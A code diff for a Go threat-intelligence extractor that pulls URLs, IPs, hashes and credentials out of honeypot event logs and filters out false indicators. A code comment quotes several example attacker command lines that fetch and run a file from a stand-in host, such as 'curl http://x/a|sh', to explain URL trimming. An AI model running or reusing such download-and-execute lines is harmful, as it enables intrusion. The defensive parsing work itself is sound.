@@ -164,18 +164,160 @@ func ipv4Part(s string) (uint64, bool) {
 // contexts would produce different IOC values/IDs.
 const urlTrailingCutset = ".,;:!?)]}>'\"|&"
 
+// urlShellStops end a URL inside a command line: a URL never holds them
+// unencoded, but shell input puts them straight after one, as in
+// "wget http://x/a;chmod +x a", "curl http://x/a|sh", "wget http://x/a>/dev/null",
+// "wget${IFS}http://x/a${IFS}-O-" or "$(curl http://x/a$(id -u))". A single
+// '&' stays: it separates query parameters.
+var urlShellStops = []string{";", "|", "`", "<", ">", "&&", "${", "$("}
+
 // trimURL cleans a URL captured from a command line. A URL cannot contain
 // whitespace or control characters, but the regex class [^\s"'] only excludes
 // Go's ASCII \s ([\t\n\f\r ]) — it still admits vertical tab, NBSP and other
-// Unicode whitespace/control runes. Cut at the first such rune, then strip
-// trailing shell punctuation the greedy class over-captured.
+// Unicode whitespace/control runes. Cut at the first such rune or shell
+// separator, then strip trailing shell punctuation the greedy class
+// over-captured.
 func trimURL(u string) string {
 	if i := strings.IndexFunc(u, func(r rune) bool {
 		return unicode.IsSpace(r) || unicode.IsControl(r)
 	}); i >= 0 {
 		u = u[:i]
 	}
+	for _, stop := range urlShellStops {
+		if i := strings.Index(u, stop); i >= 0 {
+			u = u[:i]
+		}
+	}
 	return strings.TrimRight(u, urlTrailingCutset)
+}
+
+// withoutURLs returns s with every URL reURL finds (as far as trimURL keeps
+// it) blanked out, so the hash patterns do not read a hex session, cache or
+// object ID in a URL path as a file hash. The URL itself is the indicator.
+func withoutURLs(s string) string {
+	locs := reURL.FindAllStringIndex(s, -1)
+	if locs == nil {
+		return s
+	}
+	b := []byte(s)
+	for _, loc := range locs {
+		end := loc[0] + len(trimURL(s[loc[0]:loc[1]]))
+		for i := loc[0]; i < end; i++ {
+			b[i] = ' '
+		}
+	}
+	return string(b)
+}
+
+// ipEchoHosts are public services that answer with the caller's own
+// address. Bots query them before reporting home ("curl http://ipinfo.io/ip");
+// they are not attacker infrastructure, and a URL or domain IOC for one would
+// get a public service blocked. Modelled on MISP's "whats-my-ip"
+// warninglist; a host matches itself and its subdomains.
+var ipEchoHosts = map[string]bool{
+	"ipify.org": true, "ipinfo.io": true, "ifconfig.me": true, "ifconfig.co": true,
+	"icanhazip.com": true, "ipecho.net": true, "ident.me": true, "checkip.amazonaws.com": true,
+	"checkip.dyndns.org": true, "checkip.dyndns.com": true, "ip-api.com": true, "ipapi.co": true,
+	"myexternalip.com": true, "wtfismyip.com": true, "api.myip.com": true, "seeip.org": true,
+	"ipaddress.sh": true, "eth0.me": true, "ip.sb": true, "2ip.ru": true, "ipwho.is": true,
+	"whatismyipaddress.com": true, "myip.dnsomatic.com": true, "l2.io": true,
+}
+
+// isIPEchoHost reports whether host is one of ipEchoHosts or a subdomain.
+func isIPEchoHost(host string) bool {
+	for h := host; h != ""; {
+		if ipEchoHosts[h] {
+			return true
+		}
+		i := strings.IndexByte(h, '.')
+		if i < 0 {
+			break
+		}
+		h = h[i+1:]
+	}
+	return false
+}
+
+// reURLStart matches a payload that is itself a URL (a download location).
+var reURLStart = regexp.MustCompile(`(?i)^(?:https?|ftp)://`)
+
+// reRequestLine matches an HTTP request line with an origin-form target, as
+// log4pot, citrixhoneypot and conpot store the request ("GET /x?y HTTP/1.1").
+var reRequestLine = regexp.MustCompile(`^[A-Z]{3,10} (/\S*)(?: HTTP/[0-9.]+)?$`)
+
+// requestTarget returns the request target a web honeypot stored in its
+// payload: the payload itself when it is a path ("/x?y", as tanner, go-pot
+// and h0neytr4p store it), or the target of a request line; else "".
+func requestTarget(p string) string {
+	if strings.HasPrefix(p, "/") && !strings.ContainsAny(p, " \t\r\n") {
+		return p
+	}
+	if i := strings.IndexByte(p, '\n'); i >= 0 {
+		p = p[:i]
+	}
+	if m := reRequestLine.FindStringSubmatch(strings.TrimRight(p, "\r")); m != nil {
+		return m[1]
+	}
+	return ""
+}
+
+// formDecode decodes a request target the way the web application would
+// read it: %XX escapes everywhere and '+' as a space in the query. An
+// invalid escape stays as it is. One pass, so "%2541" decodes to "%41".
+func formDecode(t string) string {
+	if !strings.ContainsAny(t, "%+") {
+		return t
+	}
+	b := make([]byte, 0, len(t))
+	query := false
+	for i := 0; i < len(t); i++ {
+		c := t[i]
+		switch {
+		case c == '?':
+			query = true
+		case c == '+' && query:
+			c = ' '
+		case c == '%' && i+2 < len(t) && isHexDigit(t[i+1]) && isHexDigit(t[i+2]):
+			c = unhex(t[i+1])<<4 | unhex(t[i+2])
+			i += 2
+		}
+		b = append(b, c)
+	}
+	return string(b)
+}
+
+func isHexDigit(c byte) bool {
+	return '0' <= c && c <= '9' || 'a' <= c && c <= 'f' || 'A' <= c && c <= 'F'
+}
+
+func unhex(c byte) byte {
+	switch {
+	case '0' <= c && c <= '9':
+		return c - '0'
+	case 'a' <= c && c <= 'f':
+		return c - 'a' + 10
+	default:
+		return c - 'A' + 10
+	}
+}
+
+// sensorText reports whether the event's command field holds an NSM
+// sensor's own text rather than attacker input: fatt's JA3/HASSH
+// fingerprint (an MD5), p0f's OS name, Suricata's signature name. Mining it
+// turned a JA3 fingerprint into a malware hash IOC.
+func sensorText(event *database.Event) bool {
+	switch event.Honeypot {
+	case "fatt", "p0f", "suricata":
+		return true
+	}
+	return false
+}
+
+// forgeableSource reports whether the event's source address may be forged.
+// ddospot records the address its reflected UDP replies would hit, which is
+// the victim of the amplification attack, not the attacker.
+func forgeableSource(event *database.Event) bool {
+	return event.Honeypot == "ddospot" && !strings.EqualFold(event.Protocol, "tcp")
 }
 
 // reHxxp restores the defanged scheme (hxxp/hxxps, any case) to http/https.
@@ -257,6 +399,8 @@ func init() {
 		"fe80::/10",
 		"0.0.0.0/8",
 		"100.64.0.0/10",
+		"192.0.0.0/24",  // IETF protocol assignments
+		"198.18.0.0/15", // benchmarking; also Clash-style proxies' fake IPs
 		"240.0.0.0/4",
 	}
 	for _, cidr := range cidrs {
@@ -270,7 +414,10 @@ func init() {
 // isPrivateIP returns true if ip is not a routable attacker address: RFC1918,
 // loopback, link-local, unique-local, unspecified (0.0.0.0 / ::, the
 // collector's placeholder for "no source IP"), multicast, "this network"
-// 0.0.0.0/8, carrier-grade NAT, and the reserved/broadcast 240.0.0.0/4.
+// 0.0.0.0/8, carrier-grade NAT, IETF protocol assignments, benchmarking, and
+// the reserved/broadcast 240.0.0.0/4. The documentation ranges (192.0.2.0/24,
+// 198.51.100.0/24, 203.0.113.0/24) stay routable here: tests use them as
+// stand-ins for public addresses, and real captures cannot contain them.
 func isPrivateIP(ipStr string) bool {
 	ip := net.ParseIP(ipStr)
 	if ip == nil {
@@ -343,7 +490,10 @@ func (e *Extractor) Extract(event *database.Event) []*database.IOC {
 	addURLs := func(text string) {
 		for _, u := range reURL.FindAllString(text, -1) {
 			u = trimURL(u)
-			if u == "" {
+			host := urlHost(u)
+			// "http://" alone names no location; an IP-echo service is not
+			// the attacker's.
+			if host == "" || isIPEchoHost(host) {
 				continue
 			}
 			add(IOCTypeURL, u)
@@ -352,14 +502,14 @@ func (e *Extractor) Extract(event *database.Event) []*database.IOC {
 			// http://203.0.113.9/x) is an IP IOC, not a domain, which keeps the
 			// blocklist/correlation by-type correct; a loopback/private literal
 			// is not an indicator at all.
-			if typ, v := hostIOC(urlHost(u)); typ != "" {
+			if typ, v := hostIOC(host); typ != "" {
 				add(typ, v)
 			}
 		}
 	}
 
-	// Source IP
-	if event.SourceIP != "" && !isPrivateIP(event.SourceIP) {
+	// Source IP, unless it may be forged (a reflection attack's victim).
+	if event.SourceIP != "" && !isPrivateIP(event.SourceIP) && !forgeableSource(event) {
 		add(IOCTypeIP, event.SourceIP)
 	}
 
@@ -368,14 +518,15 @@ func (e *Extractor) Extract(event *database.Event) []*database.IOC {
 		add(IOCTypeCredential, event.Username+":"+event.Password)
 	}
 
-	// URLs from command
-	if event.Command != "" {
+	// URLs from command, when it is attacker input (not a sensor's text).
+	if event.Command != "" && !sensorText(event) {
 		// Refang defanged indicators (hxxp://, 1.2.3[.]4, evil[dot]com) before
 		// running the extractors, so IOCs embedded in dropped scripts, ransom
 		// notes or copy-pasted C2 are captured. The de-fanged copy feeds only
 		// the indicator regexes; the command IOC below keeps the original text.
 		cmd := refang(event.Command)
 		addURLs(cmd)
+		hashText := withoutURLs(cmd)
 
 		// File hashes — longest first (SHA512, then SHA256, SHA1, MD5) to avoid
 		// sub-matching. The \b anchors already make the lengths disjoint, but the
@@ -383,7 +534,7 @@ func (e *Extractor) Extract(event *database.Event) []*database.IOC {
 		// threat-intel feeds and `sha512sum`-based droppers use to identify
 		// payloads, so capturing it makes the IOC set usable against those feeds.
 		for _, re := range []*regexp.Regexp{reSHA512, reSHA256, reSHA1, reMD5} {
-			for _, h := range re.FindAllString(cmd, -1) {
+			for _, h := range re.FindAllString(hashText, -1) {
 				add(IOCTypeHash, strings.ToLower(h))
 			}
 		}
@@ -412,9 +563,16 @@ func (e *Extractor) Extract(event *database.Event) []*database.IOC {
 	}
 
 	// A payload that is a bare URL is a download location (cowrie/adbhoney
-	// file_download events carry it there, not in the command).
-	if p := strings.TrimSpace(string(event.Payload)); p != "" && !strings.ContainsAny(p, " \t\r\n") && reURL.MatchString(p) {
-		addURLs(refang(p))
+	// file_download events carry it there, not in the command). A web
+	// honeypot's payload is the request target, percent-encoded: a URL
+	// smuggled into it (a command injection's download, a remote include) is
+	// read decoded, so it ends where the application would see a space.
+	if p := strings.TrimSpace(string(event.Payload)); p != "" {
+		if !strings.ContainsAny(p, " \t\r\n") && reURLStart.MatchString(p) {
+			addURLs(refang(p))
+		} else if t := requestTarget(p); t != "" {
+			addURLs(refang(formDecode(t)))
+		}
 	}
 
 	// Files an attacker downloaded or uploaded (cowrie/adbhoney
